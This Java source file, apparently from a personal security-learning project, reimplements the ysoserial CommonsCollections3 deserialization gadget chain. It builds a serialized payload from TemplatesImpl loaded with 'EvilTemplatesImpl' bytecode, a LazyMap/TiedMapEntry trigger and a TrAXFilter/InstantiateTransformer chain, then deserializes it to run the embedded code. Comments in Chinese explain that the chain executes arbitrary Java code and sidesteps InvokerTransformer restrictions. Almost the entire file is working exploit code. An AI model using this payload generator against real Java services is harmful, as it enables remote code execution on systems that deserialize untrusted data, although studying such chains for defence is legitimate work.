package com.xjjlearning.hack.java.ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.xjjlearning.hack.java.classloader.bytecodes.EvilTemplatesImpl;
import com.xjjlearning.hack.java.ysoserial.payloads.util.ClassUtil;
import com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil;
import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Map;
import java.util.Optional;

/**
 * created by xjj on 2023/2/2
 */
public class CommonCollections3 {

    // TemplatesImpl + cc6
    // TemplatesImpl加载类
    // cc6反射执行函数, 但是cc6部分修改, 改InvokerTransformer 变为InstantiateTransformer
    // TemplatesImpl 能够执行任意java代码, 所以很重要

    public byte[] getPayload(String exp) throws Exception {
        class A extends TransformerFactoryImpl {}

        byte[] code = ClassUtil.classAsBytes(EvilTemplatesImpl.class);

        TemplatesImpl templates = new TemplatesImpl();
        ReflectionUtil.setFieldValue(templates, "_name", "");
        ReflectionUtil.setFieldValue(templates, "_bytecodes", new byte[][]{code});
        ReflectionUtil.setFieldValue(templates, "_tfactory", new A());

        // 假的transformerChain, 后来用反射替换成真的, 原因在于防止本地调试触发计算器
        final ChainedTransformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        // InvokerTransformer限制后寻找新的替代品
        // Transformer[] transformers = new Transformer[]{
        //         new ConstantTransformer(templates),
        //         new InvokerTransformer("newTransformer",
        //                 new Class[]{}, new Object[]{}
        //         ),
        //         new ConstantTransformer(1) // 隐藏告警日志
        // };

        // TrAXFilter 和 InstantiateTransformer
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };

        Map outerMap = LazyMap.decorate(new HashMap(), transformerChain);

        HashMap obj = new HashMap();

        obj.put(new TiedMapEntry(outerMap, "key"), "");
        outerMap.remove("key");

        ReflectionUtil.setFieldValue(transformerChain, "iTransformers", transformers);

        Optional<byte[]> b = SerializationUtil.serialize(obj);
        return b.get();
    }

    private void gadget() throws Exception {
        String exp = "";
        byte[] b = getPayload(exp);
        SerializationUtil.deserialize(b);
    }

    public static void main(String[] args) throws Exception {
        new CommonCollections3().gadget();
    }
}
